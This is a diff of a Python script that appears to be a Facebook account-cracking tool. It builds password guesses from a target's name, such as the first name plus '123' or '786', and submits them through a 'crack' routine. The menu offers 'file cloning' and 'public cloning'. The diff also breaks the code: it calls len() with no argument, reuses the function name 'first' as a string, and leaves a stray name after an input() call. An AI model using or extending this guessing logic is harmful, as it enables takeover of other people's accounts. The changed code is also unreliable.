@@ -235,18 +235,18 @@ def first():
 			frs = nmf.split(' ')[0]
 			pwv = ['445566']
 			if len(nmf)<6:
-				if len(frs)<3:
+				if len(first)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(first+'123')
+					pwv.append(first+'12345')
 			else:
-				if len(frs)<3:
+				if len()<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(first+'123')
+					pwv.append(first+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -285,17 +285,17 @@ def name2():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(first+'123')
+					pwv.append(first+'12345')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'786')
+					pwv.append(first+'123')
+					pwv.append(first+'12345')
+					pwv.append(first+'1234')
+					pwv.append(first+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -459,7 +459,7 @@ class Main:
 			time.sleep(3.0)
 			print("\033[1;37m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
 			print("")
-			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")
+			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")Krishna R. Chhetri
 			time.sleep(3.1)
 			print("Krishna R. Chhetri")
 			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••KR!SHNA_🔥•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
@@ -467,7 +467,7 @@ class Main:
 			os.system("clear")
 		print(logo)
 		print(" [+]𝗠𝗘𝗡𝗨  𝗠𝗘𝗧𝗛𝗢𝗗")
-		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
+		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - ---")
 		print(" \033[1;32m[1]\033[0;92m ғɪʟᴇ ᴄʟᴏɴɪɴɢ ")
 		print(" \033[1;32m[2] ᴘᴜʙʟɪᴄ ᴄʟᴏɴɪɴɢ")
 		print(" \33[1;32m[3] in process")
